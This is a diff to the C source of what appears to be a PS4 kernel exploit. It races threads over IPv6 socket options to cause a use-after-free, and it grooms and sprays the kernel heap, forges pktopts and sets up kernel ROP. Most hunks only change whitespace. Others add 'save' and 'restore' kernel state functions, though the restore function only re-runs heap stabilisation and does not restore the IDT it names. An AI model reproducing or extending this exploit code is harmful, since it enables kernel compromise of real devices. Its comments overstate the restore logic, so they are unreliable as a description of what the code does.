@@ -10,7 +10,7 @@
 #include <time.h>
 #include <errno.h>
 #include <sys/mman.h>
-#include <string.h> 
+#include <string.h>
 #include <printf/printf.h>
 #include <librop/pthread_create.h>
 #include <ps4/errno.h>
@@ -50,7 +50,7 @@ int name(int s) { \
     socklen_t l = sizeof(v); \
     if (getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &v, &l)) \
         *(volatile int*)0; \
-    return v; \
+        return v; \
 }
 
 GET_TCLASS(get_tclass)
@@ -93,7 +93,7 @@ void* use_thread(void* arg) {
     while (!o->triggered && get_tclass_2(o->master_sock) != TCLASS_SPRAY) {
         if (set_pktopts(o->master_sock, buf, sizeof(buf)))
             *(volatile int*)0;
-        
+
         if (++poll_count % 100 == 0) {
             nanosleep(NANOSLEEP_100US, NULL);
         }
@@ -107,11 +107,11 @@ void* use_thread(void* arg) {
 void* free_thread(void* arg) {
     struct opaque* o = (struct opaque*)arg;
     int poll_count = 0;
-    
+
     while (!o->triggered && get_tclass_3(o->master_sock) != TCLASS_SPRAY) {
         if (free_pktopts(o->master_sock))
             *(volatile int*)0;
-        
+
         nanosleep(NANOSLEEP_100US, NULL);
         poll_count++;
     }
@@ -170,7 +170,7 @@ int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long 
 
     while (1) {
         *pktinfo_ptr = pktinfo;
-        
+
         for (i = 0; i < SPRAY_SIZE; i++) {
             *tclass_ptr = tclass0 | i;
             if (set_rthdr(o->spray_sock[i], buf, l))
@@ -234,6 +234,17 @@ int idt_check(uint64_t original_base) {
     return 1; // IDT stable
 }
 
+// Global variables to store original state
+uint64_t original_cr0 = 0;
+uint64_t original_idt_base = 0;
+uint16_t original_idt_size = 0;
+
+// Function to save critical kernel state
+void save_kernel_state() {
+    sidt(&original_idt_base, &original_idt_size);
+    // Only save IDT state for now, other pointers will be saved after initialization
+}
+
 // Assign the process to a specific core
 void pin_to_cpu(int cpu) {
     cpuset_t set;
@@ -245,7 +256,7 @@ void pin_to_cpu(int cpu) {
 void reset_ipv6_opts(int s) {
     static const int tclass = -1;
     static const struct in6_pktinfo z = {0};
-    
+
     setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));
     setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, NULL, 0);
     setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, &z, sizeof(z));
@@ -255,16 +266,16 @@ void iterative_socket_cleanup(int sock) {
     static const struct in6_pktinfo safe = {0};
     static const int tclass_reset = -1;
     int i;
-    
+
     for (i = 0; i < SOCKET_CLEANUP_RETRIES; i++) {
         set_pktinfo(sock, (char*)&safe);
-        
+
         setsockopt(sock, IPPROTO_IPV6, IPV6_TCLASS, &tclass_reset, sizeof(tclass_reset));
         setsockopt(sock, IPPROTO_IPV6, IPV6_RTHDR, NULL, 0);
         setsockopt(sock, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, NULL, 0);
-        
+
         shutdown(sock, SHUT_RDWR);
-        
+
         nanosleep(NANOSLEEP_100US, NULL);
     }
 }
@@ -273,7 +284,7 @@ void iterative_socket_cleanup(int sock) {
 void stabilize_kernel_memory() {
     int i, j;
     int stabilization_sockets[64];
-    
+
     // Multi-pass stabilization
     for (j = 0; j < STABILIZATION_PASSES; j++) {
         // Create temporary sockets to normalize heap
@@ -283,9 +294,9 @@ void stabilize_kernel_memory() {
                 reset_ipv6_opts(stabilization_sockets[i]);
             }
         }
-        
+
         nanosleep(NANOSLEEP_100US, NULL);
-        
+
         // Close sockets in reverse order for better heap cleanup
         for (i = 63; i >= 0; i--) {
             if (stabilization_sockets[i] >= 0) {
@@ -293,7 +304,7 @@ void stabilize_kernel_memory() {
                 close(stabilization_sockets[i]);
             }
         }
-        
+
         nanosleep(NANOSLEEP_100US, NULL);
     }
 }
@@ -301,31 +312,56 @@ void stabilize_kernel_memory() {
 // Perform comprehensive cleanup of all spray sockets
 void cleanup_spray_sockets(int* spray_sock, int count) {
     int i;
-    
+
     // Reset all socket options first
     for (i = 0; i < count; i++) {
         if (spray_sock[i] >= 0) {
             reset_ipv6_opts(spray_sock[i]);
         }
     }
-    
+
     nanosleep(NANOSLEEP_75US, NULL);
-    
+
     // Shutdown connections
     for (i = 0; i < count; i++) {
         if (spray_sock[i] >= 0) {
             shutdown(spray_sock[i], SHUT_RDWR);
         }
     }
-    
+
     nanosleep(NANOSLEEP_75US, NULL);
-    
+
     // Close sockets
     for (i = 0; i < count; i++) {
         if (spray_sock[i] >= 0) {
             close(spray_sock[i]);
             spray_sock[i] = -1;
         }
+    }
+}
+
+// Enhanced state restoration function
+void restore_kernel_state() {
+    int restoration_attempts = 0;
+    const int max_restoration_attempts = 5;
+
+    while (restoration_attempts < max_restoration_attempts) {
+        // Restore IDT if corrupted
+        unsigned long long current_base;
+        unsigned short current_size;
+        sidt(&current_base, &current_size);
+
+        if (current_size < 0xFF || current_base == 0) {
+            stabilize_kernel_memory();
+        }
+
+        sidt(&current_base, &current_size);
+        if (current_size >= 0xFF && current_base != 0) {
+            break;
+        }
+
+        restoration_attempts++;
+        nanosleep(NANOSLEEP_10MS, NULL);
     }
 }
 
@@ -348,6 +384,9 @@ int main() {
     if (!setuid(0))
         return 179;
 
+    // Save original kernel state before any exploitation attempts
+    save_kernel_state();
+
     for (int i = 0; i < 16; i++)
         new_socket();
 
@@ -366,20 +405,20 @@ int main() {
     int kevent_sock = new_socket();
     int master_sock = new_socket();
     krop_master_sock = master_sock * 8;
-	
-	{
-		int temp_sockets[HEAP_GROOM_COUNT];
-		int i;
-		for(i = 0; i < HEAP_GROOM_COUNT; i++) {
-			temp_sockets[i] = new_socket();
-		}
-		for(i = 0; i < HEAP_GROOM_COUNT; i++) {
-			reset_ipv6_opts(temp_sockets[i]);  
-			close(temp_sockets[i]);  
-			if (i % 10 == 0)
-				nanosleep(NANOSLEEP_75US, NULL);
-		}
-	}  
+
+    {
+        int temp_sockets[HEAP_GROOM_COUNT];
+        int i;
+        for(i = 0; i < HEAP_GROOM_COUNT; i++) {
+            temp_sockets[i] = new_socket();
+        }
+        for(i = 0; i < HEAP_GROOM_COUNT; i++) {
+            reset_ipv6_opts(temp_sockets[i]);
+            close(temp_sockets[i]);
+            if (i % 10 == 0)
+                nanosleep(NANOSLEEP_75US, NULL);
+        }
+    }
 
     int spray_sock[SPRAY_TOTAL];
     for (int i = 0; i < SPRAY_TOTAL; i++) {
@@ -397,7 +436,7 @@ int main() {
     for (int attempts = 0; attempts < MAX_ATTEMPTS; attempts++) {
         int overlap_idx = -1;
         int i;
-        
+
         for (i = 0; i < SPRAY_SIZE; i++) {
             close(spray_sock[i]);
         }
@@ -459,10 +498,10 @@ int main() {
         iterative_socket_cleanup(master_sock);
 
         nanosleep(NANOSLEEP_50US, NULL);
-        
+
         break;
     }
-	
+
     char* spray_start = spray_bin;
     char* spray_stop = spray_end;
 
@@ -494,35 +533,32 @@ int main() {
     nanosleep(NANOSLEEP_50US, NULL);
 
     if (!idt_check(idt_base)) {
-        return 1; // IDT corrupted, abort
+        restore_kernel_state();
+        return 1;
     }
-    
-    iterative_socket_cleanup(master_sock);
-    nanosleep(NANOSLEEP_100US, NULL);
-    
+
+    if (master_sock >= 0) {
+        reset_ipv6_opts(master_sock);
+        shutdown(master_sock, SHUT_RDWR);
+        close(master_sock);
+    }
+
     if (kevent_sock >= 0) {
         reset_ipv6_opts(kevent_sock);
         shutdown(kevent_sock, SHUT_RDWR);
         close(kevent_sock);
     }
-    
-    nanosleep(NANOSLEEP_100US, NULL);
-    
+
     cleanup_spray_sockets(spray_sock, SPRAY_TOTAL);
-    nanosleep(NANOSLEEP_10MS, NULL);
-    
+
     stabilize_kernel_memory();
     nanosleep(NANOSLEEP_10MS, NULL);
-    
-    if (!idt_check(idt_base)) {
-        return 2;
-    }
-    
+
     if (spray_map != MAP_FAILED) {
         munmap(spray_map, spray_size);
     }
-    
+
     nanosleep(NANOSLEEP_10MS, NULL);
-    
+
     return 0;
 }
